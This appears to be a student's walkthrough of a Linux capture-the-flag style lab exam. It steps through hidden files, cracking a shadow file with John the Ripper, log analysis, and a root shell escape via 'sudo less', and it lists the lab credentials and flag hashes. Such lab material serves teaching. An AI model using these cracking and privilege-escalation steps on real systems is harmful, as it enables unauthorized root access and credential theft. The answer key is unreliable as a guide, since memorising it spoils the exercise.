# Linux Scavenger Hunt - Complete Guide

## Initial Setup

Start the scavenger hunt exam:

```bash
sudo ./scavenger-hunt-start.sh
```

If Docker needs to be installed:

```bash
sudo apt install docker.io -y
```

Then select option `1 - Start Apps`

Connect to the target system:

```bash
ssh student@192.168.200.105
```

---

## Flag #1: Hidden File in Desktop

**Objective:** Find a hidden file in the Desktop directory

**Commands:**

```bash
ls -a ~/Desktop
```

**Expected Output:**
```
/home/student/Desktop/.flag_1
```

---

## Flag #2: Password Cracking with John the Ripper

**Objective:** Crack the shadow file to get credentials

**Commands:**

```bash
# Crack the password
john --wordlist=/home/student/Desktop/.pass_list.txt /home/student/Documents/my-files/shadow

# Display cracked credentials
john --show /home/student/Documents/my-files/shadow
```

**Expected Credentials:**
- Username: `mitnick`
- Password: `trustno1`

**Login:**

```bash
su mitnick
```

---

## Flag #3: Log File Analysis & ZIP Extraction

**Objective:** Extract IP addresses from a log file to find a password

**Step 1:** Find the mitnick log file

```bash
find / -name "mitnick*" 2>/dev/null
```

**Expected Output:**
```
/var/log/mitnick.log
```

**Step 2:** Count unique IP addresses (this becomes the password)

```bash
awk '{print $1}' /var/log/mitnick.log | sort -u | wc -l
```
**sort note:** 
sort only sorts by line left to right
sort -u =sort the uniq line (left out dplicated line but contains 1st time seen, left out 2nd and more repeat)
wc= word count; 
  when done file like $wc file.txt it will show 1. line count 2. word count 3. byte 4. filename
  when done with sort= ... sort | wc     =>  3 cloumn summary - line word, byte
  when done with sort= ... sort | wc -l  =>  only summary of line i.e line count only
  

**Expected Answer:** `102` (this is the password for the ZIP file)

**Step 3:** Find and extract the ZIP file

```bash
find / -name "*.zip" 2>/dev/null
```

**Expected Output:** `/home/mitnick/Documents/.secret.zip` (among others)

**Step 4:** Extract the ZIP with password `102`

```bash
unzip /home/mitnick/Documents/.secret.zip
```

The extracted file `babbage` will contain:
```
babbage : freedom
```

**Step 5:** Login as babbage

```bash
su babbage
```

**Flag #3 will be revealed**

---

## Flag #4: File Permissions Search

**Objective:** Find files with specific permissions (401) and extract credentials

**Commands:**

```bash
# Find files with 401 permission
find . -perm 401
```

**Check files one by one until you find:**

```bash
cat stallman
```

**Expected Output:**
```
computer
```

**Credentials Found:**
- Username: `stallman`
- Password: `computer`

**Login:**

```bash
su stallman
```

**Flag #4 will be revealed**

---

## Flag #5: Shell Script Execution

**Objective:** Find and execute a shell script

**Commands:**

```bash
cd ~
cd Documents
ls
```

**Look for:** `flag5.sh`

**Run the script:**

```bash
./flag5.sh
```

**Expected Output:** Flag #5 hash and next user's password

**Next Credentials:**
- Username: `sysadmin`
- Password: `passw0rd`

---

## Flag #6: Bash Alias Execution

**Objective:** Find and run an alias command

**Login as sysadmin:**

```bash
su sysadmin
```

**Find the flag alias:**

```bash
cat ~/.bashrc | grep alias
```

**Run the flag alias:**

```bash
flag
```

**Flag #6 will be displayed**

---

## Flag #7: Privilege Escalation via `less`

**Objective:** Escape to root shell using `less` vulnerability

### Security Explanation

The `less` command has a built-in feature to execute terminal commands using `!`. When run with `sudo`, this becomes a critical privilege escalation vector:

- **Trigger:** Press `!` inside the `less` viewer
- **Action:** Type `sh` or `bash` and press Enter
- **Result:** Instant root shell with full system access

### Why This Works

- The `less` program is running with full root administrative privileges when invoked with `sudo`
- The `!` character in `less` opens a command prompt at the bottom of the screen
- This allows direct execution of shell commands in the context of the current process (root)
- This bypasses standard security restrictions and authentication mechanisms

### Steps to Execute:

**Step 1:** Create a file with shell escape content

```bash
nano superfile.txt
```

Add the text:
```
!su
```

Save and exit (Ctrl+X, Y, Enter)

**Step 2:** Open the file with sudo less

```bash
sudo less superfile.txt
```

**Step 3:** Escape to root

Inside the `less` viewer:
1. Press `Shift + !`
2. Type `sh` or `bash`
3. Press Enter

**Step 4:** Verify root access

```bash
whoami
```

**Expected Output:**
```
root
```

**Flag #7 will be created**

---

## Flag #8: Hash Compilation & Cracking

**Objective:** Compile all flags, hash them, and crack with John the Ripper

**Step 1:** Ensure you're logged in as root

```bash
whoami
```

**Expected Output:**
```
root
```

**Step 2:** Create and populate flags file

```bash
touch ~/flags.txt
nano ~/flags.txt
```

**Add all the flags (hashed format):**

```
flag_1:$1$WYmnR327$5C1yY4flBxB1cLjkc92Tq.
flag_2:$1$PEDICYq8$6/U/a5Ykxw1OP0.eSrMZO0
flag_3:$1$Y9tp8XTi$m6pAR1bQ36oAh.At4G5s3.
flag_4:$1$lGQ7QprJ$m4eE.b8jhvsp8CNbuIF5U0
flag_5:$1$zuzYyKCN$secHwYBXIELGqOv8rWzG00
flag_6:$1$Qbq.XLLp$oj.BXuxR2q99bJwNEFhSH1
flag_7:$1$zmr05X2t$QfOdeJVDpph5pBPpVL6oy0
```

Save and exit

**Step 3:** Crack all hashes with John the Ripper

```bash
john --format=md5crypt --wordlist=/home/student/Desktop/.pass_list.txt ~/flags.txt
```

**Alternative:**

```bash
john --wordlist=/home/student/Desktop/.pass_list.txt ~/flags.txt
```

**Step 4:** Display cracked passwords

```bash
john --show ~/flags.txt
```

**All flags will be revealed!**

---

## Quick Reference Summary

| Flag | Method | Key Command |
|------|--------|-------------|
| #1 | File search | `ls -a ~/Desktop` |
| #2 | Password cracking | `john --wordlist=... shadow` |
| #3 | Log analysis + ZIP | `awk` + `unzip` |
| #4 | Permission search | `find . -perm 401` |
| #5 | Script execution | `./flag5.sh` |
| #6 | Alias execution | `flag` alias |
| #7 | Privilege escalation | `sudo less` + `!sh` |
| #8 | Hash cracking | `john --show` |

---

## Key Security Concepts Demonstrated

1. **Hidden Files:** Using `-a` flag with `ls` to reveal files starting with `.`
2. **Password Cracking:** John the Ripper with wordlists for brute-force attacks
3. **Log Analysis:** Using `awk`, `sort`, and `wc` for data extraction and counting
4. **File Permissions:** Searching by specific permission bits (octal notation)
5. **Privilege Escalation:** Exploiting built-in `less` command features to escape to root
6. **Hash Cracking:** MD5crypt format password recovery
7. **Lateral Movement:** Using compromised credentials to escalate privileges between users
8. **Shell Escapes:** Understanding how programs can be used as vectors for privilege escalation

---

## Command Cheat Sheet

```bash
# Finding files
ls -a                              # List all files (including hidden)
find / -name "pattern" 2>/dev/null # Find files by name

# Text processing
awk '{print $1}' file              # Extract first field
sort -u                            # Sort and remove duplicates
wc -l                              # Count lines

# User switching
su username                        # Switch to another user
sudo command                       # Execute with root privileges

# File permissions
find . -perm 401                   # Find files with specific permissions
chmod 401 file                     # Change file permissions

# Password cracking
john --wordlist=file /etc/shadow   # Crack shadow file
john --show file                   # Display cracked passwords

# Archive extraction
unzip file.zip                     # Extract ZIP file
unzip -l file.zip                  # List ZIP contents

# Less viewer
less file                          # Open file in pager
!command                           # Execute command from within less
```
